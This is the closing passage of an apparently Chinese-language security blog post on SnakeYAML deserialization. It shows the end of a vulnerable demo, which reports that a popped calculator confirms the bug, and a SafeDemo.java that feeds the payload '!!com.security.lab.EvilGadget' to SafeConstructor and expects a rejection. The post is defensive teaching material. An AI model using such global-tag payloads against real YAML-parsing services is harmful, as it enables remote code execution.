+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[*] 返回类型: &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=p>(</span><span class=n>result</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=w> </span><span class=o>?</span><span class=w> </span><span class=s>&#34;null&#34;</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=n>result</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getName</span><span class=p>()));</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;提示: 若弹出计算器，说明漏洞已触发。对比安全写法请运行 SafeDemo。&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=p>}</span><span class=w>
+</span></span></span></code></pre></div><p>后面的是安全的代码示例</p><p>SafeDemo.java</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>com.security.lab</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.yaml.snakeyaml.LoaderOptions</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.yaml.snakeyaml.Yaml</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.yaml.snakeyaml.constructor.SafeConstructor</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=cm>/**
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> * 安全对照：使用 SafeConstructor，禁止任意类实例化。
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> *
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> * SnakeYAML 1.x: new Yaml(new SafeConstructor())
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> * SnakeYAML 2.x: 默认更严格，并推荐 LoaderOptions + 明确允许的类型
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm> */</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>SafeDemo</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;=== SnakeYAML 安全加载演示 (SafeDemo) ===&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>malicious</span><span class=w> </span><span class=o>=</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=s>&#34;!!com.security.lab.EvilGadget\n&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[*] 恶意 YAML:&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>print</span><span class=p>(</span><span class=n>malicious</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=c1>// SnakeYAML 1.33 支持带 LoaderOptions 的 SafeConstructor</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>LoaderOptions</span><span class=w> </span><span class=n>options</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>LoaderOptions</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Yaml</span><span class=w> </span><span class=n>yaml</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Yaml</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>SafeConstructor</span><span class=p>(</span><span class=n>options</span><span class=p>));</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Object</span><span class=w> </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>yaml</span><span class=p>.</span><span class=na>load</span><span class=p>(</span><span class=n>malicious</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[*] 意外成功? result=&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>result</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Exception</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[+] 预期失败：SafeConstructor 拒绝全局 Tag / 任意类&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[+] 异常类型: &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>e</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getName</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[+] 信息: &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>e</span><span class=p>.</span><span class=na>getMessage</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>  
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[*] 安全用法仍可加载基础类型:&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Yaml</span><span class=w> </span><span class=n>safe</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Yaml</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>SafeConstructor</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>LoaderOptions</span><span class=p>()));</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Object</span><span class=w> </span><span class=n>map</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>safe</span><span class=p>.</span><span class=na>load</span><span class=p>(</span><span class=s>&#34;name: alice\nage: 18\n&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;[+] 正常 Map: &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>map</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=p>}</span><span class=w>
+</span></span></span></code></pre></div></div></article></section><footer class=footer><p>© 2026 1ux4ry</p><p>Built with Hugo. Layout inspired by a minimalist blog feed, restyled for your own voice.</p></footer></div><script src=/js/main.js></script></body></html>
